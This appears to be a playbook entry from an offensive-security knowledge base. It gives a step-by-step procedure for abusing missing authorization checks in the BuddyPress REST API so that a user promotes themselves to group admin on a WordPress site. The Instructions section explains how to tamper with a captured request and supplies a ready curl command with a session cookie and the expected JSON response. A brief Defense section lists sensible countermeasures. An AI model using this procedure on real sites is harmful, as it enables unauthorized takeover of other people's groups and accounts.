---
id: uuid-placeholder-5
tags:
  - privilege-escalation
  - rest-api
  - modification
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/buddypress-group-member-promote]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:51.919Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-and-Send-API-Request-for-Self-Promotion

## Summary

This core procedure modifies a captured legitimate BuddyPress REST API request to target a different group and promote the attacker to admin, exploiting missing authorization checks.

## Description

Using the intercepted request from group 'def', alter the group_id to 'abc's ID, set user_id to attacker's (B), and change the body to action=promote&role=admin. Replay via dev tools or curl. The vulnerability stems from the API not verifying the caller's privileges for the target group. Prerequisites: Captured request and known IDs. Outcome: Unauthorized role escalation.

## Requirements

1. Captured legitimate POST request details
2. Knowledge of target group_id (abc) and user_id (B)
3. Browser dev tools or proxy like Burp for modification

## Defense

Defensive measures and detection strategies:

- Implement strict permission checks in REST API for cross-group actions
- Validate caller is admin/moderator of the specific target group
- Rate limit and log suspicious parameter changes in API calls

## Objectives

1. Bypass authorization for role promotion
2. Achieve self-escalation to admin
3. Confirm API endpoint vulnerability

## Instructions

### Step 1: Modify Request Parameters

**Context**: Edit the captured request to target escalation.

In dev tools, right-click the POST request > Copy as cURL or edit directly: Change URL to /wp-json/buddypress/v1/groups/[abc_id]/members/[b_id], body to action=promote&role=admin.

### Step 2: Replay Modified Request

**Context**: Send the altered request to exploit.

Execute [[commands/buddypress-group-member-promote]] or paste modified cURL in terminal/dev tools console.

```bash
curl -X POST 'https://example.com/wp-json/buddypress/v1/groups/123/members/456' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'action=promote&role=admin' \
  -b 'wordpress_logged_in_cookie=value'
```

> This sends the promotion request; expect 200 OK if successful, with updated role in response JSON.

**Expected Output**: JSON response like {"id":456,"role":"admin"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/buddypress-group-member-promote]]

## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- privilege-escalation
- rest-api
- modification
